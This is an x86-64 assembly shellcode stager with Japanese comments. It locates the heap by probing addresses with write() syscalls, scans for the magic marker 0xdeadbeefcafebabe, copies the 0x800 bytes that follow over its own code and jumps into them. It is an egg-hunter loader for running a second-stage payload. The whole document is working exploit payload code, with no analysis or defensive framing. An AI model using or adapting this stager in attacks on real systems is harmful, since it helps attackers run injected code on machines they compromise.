_start:
  call find_heap
  mov r15, rax
  mov r14, 0xdeadbeefcafebabe   ; magic
search:
  mov rax, [r15]
  cmp rax, r14
  jz found
  add r15, 0x10
  jmp search
found:
  add r15, 8
  mov edx, 0x800
  mov rsi, r15
  lea rdi, [rel main]
  call memcpy
  jmp main  

;; memcpy sourceからdestinationにデータをコピーする。
;;   rdi: destinationのアドレス
;;   rsi: sourceのアドレス
;;   rdx: コピーするサイズ
memcpy:
  mov rcx, rdx
  repnz movsb
  ret

;; find_heap ヒープのベースアドレスを特定する。
;;   returns: ヒープのベースアドレス
find_heap:
  mov r14d, 0x20000 ; 期待される最低限のヒープサイズ
  mov r15, 0x555555554000 + 0x5000 ; 最も低いヒープのベースアドレス
  ; 1) おおまかなアドレスを特定する
.loop_find_mapped:
  mov rdi, r15
  call is_mapped
  test al, al
  jnz .find_base                ; mapped?
  add r15, r14
  jmp .loop_find_mapped

  ; 2) ベースアドレスを特定する
.find_base:
  mov rbp, r15
  add r15, r14
.loop_find_base:
  sub rbp, 0x1000               ; ページサイズずつアドレスを下げる
  mov rdi, rbp
  call is_mapped
  test al, al
  jnz .loop_find_base

  ; 3) ELFでないことを確認する
  add rbp, 0x1000
  cmp dword [rbp], 0x464c457f
  jnz .found

  ; 4) ヒープでない場合、この領域をスキップする
.loop_skip:
  add r15, r14
  mov rdi, r15
  call is_mapped
  test al, al
  jz .loop_skip
  jmp .loop_find_mapped

.found:
  mov rax, rbp
  ret

;; is_mapped 与えられたアドレスが読み込み可能かを調べる。
;;   arg1 (rdi): 調べるアドレス
;;   returns: 読み込み可能なら1を、そうでなければ0
is_mapped:
  ; write(1, address, 1)
  mov edx, 1
  mov rsi, rdi
  mov edi, edx
  mov eax, edx
  syscall
  test rax, rax
  setns al
  movzx eax, al
  ret

main:
